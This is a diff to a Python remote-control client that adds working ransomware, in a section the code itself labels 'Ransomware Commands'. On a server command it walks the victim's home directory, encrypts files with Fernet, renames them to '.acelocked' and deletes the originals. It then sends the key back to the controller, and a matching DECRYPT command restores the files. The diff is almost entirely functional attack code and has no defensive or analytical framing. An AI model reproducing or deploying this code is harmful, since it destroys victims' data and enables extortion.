@@ -1,13 +1,18 @@
+
 import ssl
 import socket
 import threading
 import os
 import subprocess
 import shlex
-import platform # To detect OS for shell selection
-# queue is not strictly necessary with the current threading model, removed import
+import platform
 import time
-import logging # Added for better logging
+import logging
+import base64 # For key encoding
+from cryptography.fernet import Fernet, InvalidToken # Encryption library
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+import traceback # For detailed error logging
 
 # --- Client Logging Setup ---
 log_format = '%(asctime)s - %(threadName)s - %(levelname)s - %(message)s'
@@ -15,6 +20,58 @@ logging.basicConfig(level=logging.INFO, format=log_format)
 # Use standard logging
 client_logger = logging.getLogger()
 
+ENCRYPTION_EXTENSION = ".acelocked" # Extension for encrypted files
+# Directories/paths to exclude from encryption/decryption (relative to home dir or absolute)
+# Add more paths specific to OS as needed (e.g., Application Data, Library)
+EXCLUSION_LIST = [
+    # Windows specific (add more as needed)
+    "AppData",
+    "Local Settings",
+    "Application Data",
+    "Cookies",
+    "Recent",
+    "SendTo",
+    "Start Menu",
+    "Templates",
+    "Windows",
+    "Program Files",
+    "Program Files (x86)",
+    "ProgramData",
+    # macOS specific (add more as needed)
+    "Library",
+    "/Applications",
+    "/System",
+    "/usr",
+    "/bin",
+    "/sbin",
+    "/etc",
+    # Linux specific (add more as needed)
+    "/usr",
+    "/bin",
+    "/sbin",
+    "/etc",
+    "/lib",
+    "/lib64",
+    "/sys",
+    "/proc",
+    "/dev",
+    "/run",
+    ".local/share/Trash", # Common trash location
+    ".cache",
+    # Cross-platform (avoid encrypting common dev/config dirs)
+    ".git",
+    ".ssh",
+    ".config",
+    ".vscode",
+    "node_modules",
+    "venv",
+    ".env",
+    "__pycache__",
+    # Avoid self-encryption if running from user dir (adjust if needed)
+    os.path.basename(__file__) if os.path.dirname(__file__) == os.path.expanduser("~") else None,
+]
+# Filter out None in case the script isn't in home dir
+EXCLUSION_LIST = [item for item in EXCLUSION_LIST if item is not None]
 
 class Client:
     def __init__(self, host: str, port: int, cert_path=None):
@@ -186,14 +243,50 @@ class Client:
              client_logger.debug("Received PING, sending PONG.")
              self.send_message("PONG\n")
 
-        # Add handlers for other commands like file transfer here
-        # elif message.startswith("FILE "): -> Example from fixed server's send_file
-        #     self.handle_receive_file(message) -> Needs implementation
+             # --- Ransomware Commands ---
+        elif message == "ENCRYPT":
+            client_logger.info("Received ENCRYPT command. Starting encryption process in background thread.")
+            # Start encryption in a separate thread to avoid blocking message loop
+            encryption_thread = threading.Thread(
+                target=self.perform_file_operation,
+                args=('encrypt',),
+                name="EncryptionThread",
+                daemon=True  # Allows main program to exit even if this fails badly
+            )
+            encryption_thread.start()
 
-        else:
-             client_logger.warning(f"Unknown command received: {message}")
-             # Optionally send an error back to server
-             # self.send_message(f"ERROR: Unknown command '{message}'\n")
+        elif message.startswith("DECRYPT "):
+            parts = message.split(" ", 1)
+            if len(parts) == 2 and parts[1]:
+                key_b64 = parts[1].strip()
+                client_logger.info("Received DECRYPT command. Starting decryption process in background thread.")
+                try:
+                    # Decode the key passed from the command shell
+                    key_bytes = base64.urlsafe_b64decode(key_b64)
+                    if len(key_bytes) != 32:  # Fernet keys are 32 bytes url-safe base64 encoded
+                        raise ValueError("Invalid key length after decoding.")
+
+                    # Start decryption in a separate thread
+                    decryption_thread = threading.Thread(
+                        target=self.perform_file_operation,
+                        args=('decrypt', key_bytes),
+                        name="DecryptionThread",
+                        daemon=True
+                    )
+                    decryption_thread.start()
+                except (ValueError, base64.binascii.Error) as e:
+                    err_msg = f"ERROR: Invalid decryption key format received: {e}\n"
+                    client_logger.error(err_msg)
+                    self.send_message(err_msg)
+                except Exception as e:
+                    err_msg = f"ERROR: Unexpected error processing decryption key: {e}\n"
+                    client_logger.error(err_msg, exc_info=True)
+                    self.send_message(err_msg)
+            else:
+                err_msg = "ERROR: DECRYPT command received without a key.\n"
+                client_logger.warning(err_msg)
+                self.send_message(err_msg)
+
 
 
     def execute_single_command(self, command: str) -> str:
@@ -513,6 +606,9 @@ class Client:
             self.running = False
             return False
 
+    def lock_user(self):
+        pass
+
 
     def stop_client(self):
         """
@@ -561,16 +657,296 @@ class Client:
         # Shell process cleanup is handled within interactive_shell_session's finally block
 
         client_logger.info("Client stop sequence finished.")
+    # --- Ransomware Core Logic ---
 
+    def _is_excluded(self, filepath: str, home_dir: str) -> bool:
+        """Checks if a file path should be excluded based on the EXCLUSION_LIST."""
+        normalized_path = os.path.normpath(filepath)
+        normalized_home = os.path.normpath(home_dir)
+
+        # Check against absolute paths in exclusion list
+        for excluded_item in EXCLUSION_LIST:
+             if os.path.isabs(excluded_item):
+                  if normalized_path.startswith(os.path.normpath(excluded_item)):
+                     client_logger.debug(f"Excluding '{filepath}' (matches absolute exclude: {excluded_item})")
+                     return True
+             else:
+                  # Check against relative paths (assume relative to home)
+                  excluded_abs = os.path.join(normalized_home, excluded_item)
+                  if normalized_path.startswith(os.path.normpath(excluded_abs)):
+                     client_logger.debug(f"Excluding '{filepath}' (matches relative exclude: {excluded_item})")
+                     return True
+        return False
+
+
+    def find_target_files(self, mode: str) -> list[str]:
+        """
+        Finds files to encrypt or decrypt, starting from the user's home directory.
+        Excludes specified directories and the script itself.
+        """
+        target_files = []
+        try:
+            home_dir = os.path.expanduser("~")
+            if not os.path.isdir(home_dir):
+                client_logger.error(f"Home directory '{home_dir}' not found or not accessible.")
+                return []
+            client_logger.info(f"Scanning for files starting from: {home_dir}")
+        except Exception as e:
+             client_logger.error(f"Could not determine home directory: {e}")
+             return []
+
+        # --- VERY IMPORTANT WARNING ---
+        client_logger.warning("!!! FILE OPERATION SCAN STARTED !!!")
+        client_logger.warning(f"Mode: {mode.upper()}. Target dir: {home_dir}")
+        client_logger.warning("This operation is potentially DESTRUCTIVE.")
+        # --- END WARNING ---
+
+        for root, dirs, files in os.walk(home_dir, topdown=True):
+            # Check if the current directory itself should be excluded
+            if self._is_excluded(root, home_dir):
+                client_logger.debug(f"Skipping excluded directory: {root}")
+                dirs[:] = [] # Don't recurse into subdirectories of excluded path
+                continue
+
+            # Filter directories in-place to prevent walking into excluded ones later
+            # Necessary because _is_excluded checks the *start* of the path
+            dirs[:] = [d for d in dirs if not self._is_excluded(os.path.join(root, d), home_dir)]
+
+            for filename in files:
+                filepath = os.path.join(root, filename)
+
+                # Final check on the file itself (redundant but safe)
+                if self._is_excluded(filepath, home_dir):
+                     continue
+
+                # Check file extension based on mode
+                if mode == 'encrypt':
+                    # Avoid encrypting already encrypted files or system/hidden files (basic check)
+                    if not filename.endswith(ENCRYPTION_EXTENSION) and not filename.startswith('.'):
+                        target_files.append(filepath)
+                elif mode == 'decrypt':
+                    # Only target files with the specific encryption extension
+                    if filename.endswith(ENCRYPTION_EXTENSION):
+                        target_files.append(filepath)
+
+        client_logger.info(f"Found {len(target_files)} potential target files for {mode}.")
+        return target_files
+
+    def _encrypt_file(self, fernet: Fernet, filepath: str) -> tuple[bool, str]:
+        """Encrypts a single file, overwrites original."""
+        encrypted_filepath = filepath + ENCRYPTION_EXTENSION
+        client_logger.debug(f"Attempting to encrypt: {filepath}")
+        try:
+            # Read original content
+            with open(filepath, 'rb') as f_orig:
+                original_content = f_orig.read()
+
+            # Encrypt content
+            encrypted_content = fernet.encrypt(original_content)
+
+            # Write encrypted content to new file
+            with open(encrypted_filepath, 'wb') as f_enc:
+                f_enc.write(encrypted_content)
+
+            # Verify write (optional but good practice)
+            if os.path.getsize(encrypted_filepath) == 0 and len(encrypted_content) > 0:
+                 raise OSError(f"Write verification failed: '{encrypted_filepath}' is 0 bytes.")
+
+            # --- Destructive Action: Remove Original ---
+            try:
+                 os.remove(filepath)
+                 client_logger.info(f"Encrypted '{filepath}' -> '{encrypted_filepath}' and removed original.")
+                 return True, f"Encrypted {os.path.basename(filepath)}"
+            except OSError as rm_err:
+                 # If removal fails, try to remove the newly created encrypted file to avoid partial state
+                 client_logger.error(f"Failed to remove original file '{filepath}' after encryption: {rm_err}. Attempting cleanup.")
+                 try: os.remove(encrypted_filepath)
+                 except: pass
+                 return False, f"ERROR: Failed to remove original {os.path.basename(filepath)}: {rm_err}"
+            # --- End Destructive Action ---
+
+        except (IOError, OSError) as e:
+            client_logger.error(f"I/O Error encrypting '{filepath}': {e}")
+            # Clean up potentially created empty encrypted file
+            if os.path.exists(encrypted_filepath) and os.path.getsize(encrypted_filepath) == 0:
+                try: os.remove(encrypted_filepath)
+                except: pass
+            return False, f"ERROR: I/O Error encrypting {os.path.basename(filepath)}: {e}"
+        except InvalidToken: # Should not happen with encrypt, but belt-and-suspenders
+             client_logger.error(f"Invalid Token during encryption (unexpected): {filepath}")
+             return False, f"ERROR: Crypto Token Error encrypting {os.path.basename(filepath)}"
+        except Exception as e:
+            client_logger.error(f"Unexpected Error encrypting '{filepath}': {e}", exc_info=True)
+            # Clean up potentially created empty encrypted file
+            if os.path.exists(encrypted_filepath) and os.path.getsize(encrypted_filepath) == 0:
+                try: os.remove(encrypted_filepath)
+                except: pass
+            return False, f"ERROR: Unexpected error encrypting {os.path.basename(filepath)}: {e}"
+
+    def _decrypt_file(self, fernet: Fernet, filepath: str) -> tuple[bool, str]:
+        """Decrypts a single file, removes encrypted original."""
+        if not filepath.endswith(ENCRYPTION_EXTENSION):
+            return False, f"ERROR: File '{os.path.basename(filepath)}' does not have expected extension '{ENCRYPTION_EXTENSION}'"
+
+        original_filepath = filepath[:-len(ENCRYPTION_EXTENSION)]
+        client_logger.debug(f"Attempting to decrypt: {filepath}")
+        try:
+            # Read encrypted content
+            with open(filepath, 'rb') as f_enc:
+                encrypted_content = f_enc.read()
+                if not encrypted_content: # Handle empty files if they exist
+                    client_logger.warning(f"Skipping empty encrypted file: {filepath}")
+                    # Optionally remove the empty file here
+                    # try: os.remove(filepath) except: pass
+                    return False, f"Skipped empty file {os.path.basename(filepath)}"
+
+
+            # Decrypt content
+            decrypted_content = fernet.decrypt(encrypted_content)
+
+            # Write decrypted content back to original filename
+            with open(original_filepath, 'wb') as f_dec:
+                f_dec.write(decrypted_content)
+
+            # Verify write (optional)
+            if os.path.getsize(original_filepath) == 0 and len(decrypted_content) > 0:
+                 raise OSError(f"Write verification failed: '{original_filepath}' is 0 bytes.")
+
+            # --- Destructive Action: Remove Encrypted File ---
+            try:
+                 os.remove(filepath)
+                 client_logger.info(f"Decrypted '{filepath}' -> '{original_filepath}' and removed encrypted file.")
+                 return True, f"Decrypted {os.path.basename(original_filepath)}"
+            except OSError as rm_err:
+                 # If removal fails, try to remove the newly created decrypted file to avoid partial state
+                 client_logger.error(f"Failed to remove encrypted file '{filepath}' after decryption: {rm_err}. Attempting cleanup.")
+                 try: os.remove(original_filepath)
+                 except: pass
+                 return False, f"ERROR: Failed to remove encrypted {os.path.basename(filepath)}: {rm_err}"
+            # --- End Destructive Action ---
+
+        except InvalidToken:
+            client_logger.error(f"Decryption failed (Invalid Token - wrong key or corrupted file?): {filepath}")
+            return False, f"ERROR: Decryption failed for {os.path.basename(filepath)} (Wrong Key / Corrupted?)"
+        except (IOError, OSError) as e:
+            client_logger.error(f"I/O Error decrypting '{filepath}': {e}")
+            # Clean up potentially created empty decrypted file
+            if os.path.exists(original_filepath) and os.path.getsize(original_filepath) == 0:
+                try: os.remove(original_filepath)
+                except: pass
+            return False, f"ERROR: I/O Error decrypting {os.path.basename(filepath)}: {e}"
+        except Exception as e:
+            client_logger.error(f"Unexpected Error decrypting '{filepath}': {e}", exc_info=True)
+            # Clean up potentially created empty decrypted file
+            if os.path.exists(original_filepath) and os.path.getsize(original_filepath) == 0:
+                try: os.remove(original_filepath)
+                except: pass
+            return False, f"ERROR: Unexpected error decrypting {os.path.basename(filepath)}: {e}"
+
+
+    def perform_file_operation(self, mode: str, key_bytes: bytes = None):
+        """
+        Worker function (run in a thread) to perform encryption or decryption.
+        Sends status updates back to the server.
+        """
+        start_time = time.time()
+        processed_count = 0
+        error_count = 0
+        status_interval = 5 # Send update every N files processed
+        last_status_time = start_time
+
+        try:
+            if mode == 'encrypt':
+                # Generate a new key for each encryption operation
+                key_bytes = Fernet.generate_key()
+                fernet = Fernet(key_bytes)
+                key_b64 = base64.urlsafe_b64encode(key_bytes).decode('utf-8')
+                self.send_message(f"STATUS: Starting encryption. Generated key (KEEP SAFE!): {key_b64}\n")
+                client_logger.info(f"Generated Fernet key for encryption: {key_b64}")
+            elif mode == 'decrypt':
+                if not key_bytes:
+                    err_msg = "ERROR: Decryption started without a key.\n"
+                    client_logger.error(err_msg)
+                    self.send_message(err_msg)
+                    return
+                try:
+                    fernet = Fernet(key_bytes)
+                    key_b64 = base64.urlsafe_b64encode(key_bytes).decode('utf-8') # For logging only
+                    self.send_message("STATUS: Starting decryption with provided key.\n")
+                    client_logger.info(f"Using provided Fernet key for decryption: {key_b64}")
+                except (ValueError, TypeError) as key_err:
+                    err_msg = f"ERROR: Invalid key provided for decryption: {key_err}\n"
+                    client_logger.error(err_msg)
+                    self.send_message(err_msg)
+                    return
+            else:
+                self.send_message(f"ERROR: Invalid mode '{mode}' requested.\n")
+                return
+
+            # Find files (this can take time)
+            self.send_message("STATUS: Scanning for target files...\n")
+            target_files = self.find_target_files(mode)
+            if not target_files:
+                 self.send_message(f"STATUS: No target files found for {mode}.\n")
+                 return
+
+            self.send_message(f"STATUS: Found {len(target_files)} files. Starting {mode} process...\n")
+
+            # Process files
+            for i, filepath in enumerate(target_files):
+                 # Check if client is still running before processing next file
+                 if not self.running:
+                      client_logger.warning(f"Client stopped during {mode}. Aborting.")
+                      self.send_message(f"STATUS: Operation aborted (client stopped).\n")
+                      break
+
+                 if mode == 'encrypt':
+                      success, message = self._encrypt_file(fernet, filepath)
+                 else: # decrypt
+                      success, message = self._decrypt_file(fernet, filepath)
+
+                 if success:
+                      processed_count += 1
+                 else:
+                      error_count += 1
+
+                 # Send periodic status updates (non-error messages)
+                 current_time = time.time()
+                 if success and (processed_count % status_interval == 0 or current_time - last_status_time > 10.0):
+                      self.send_message(f"STATUS: ({processed_count}/{len(target_files)}) {message}\n")
+                      last_status_time = current_time
+                 elif not success: # Always send error messages immediately
+                      self.send_message(f"STATUS: ({i+1}/{len(target_files)}) {message}\n")
+
+
+            # Final Report
+            end_time = time.time()
+            duration = end_time - start_time
+            final_msg = f"COMPLETED: {mode.capitalize()} finished in {duration:.2f}s. " \
+                        f"Processed: {processed_count}, Errors: {error_count}.\n"
+            client_logger.info(final_msg.strip())
+            self.send_message(final_msg)
+
+            # Send key again at the end for encryption for redundancy
+            if mode == 'encrypt':
+                 key_b64 = base64.urlsafe_b64encode(key_bytes).decode('utf-8')
+                 self.send_message(f"KEY: {key_b64}\n") # Use distinct prefix for easy parsing
+
+        except Exception as e:
+            error_trace = traceback.format_exc()
+            err_msg = f"FATAL ERROR during {mode}: {e}\nTrace:\n{error_trace}\n"
+            client_logger.critical(err_msg)
+            # Try to send fatal error back to server
+            self.send_message(err_msg)
 
 # --- Example Usage ---
 if __name__ == "__main__":
     SERVER_HOST = "127.0.0.1"  # Server IP or hostname
     SERVER_PORT = 8000         # Server Port
     # Optional: Path to server.crt or CA cert bundle for verification
-    CERT_FILE = '../ssl_deets/server.crt'
+    # CERT_FILE = '../ssl_deets/server.crt'
 
-    client_instance = Client(SERVER_HOST, SERVER_PORT, cert_path=CERT_FILE)
+    client_instance = Client(SERVER_HOST, SERVER_PORT)
     main_thread = threading.current_thread()
     main_thread.name = "ClientMainThread"
 
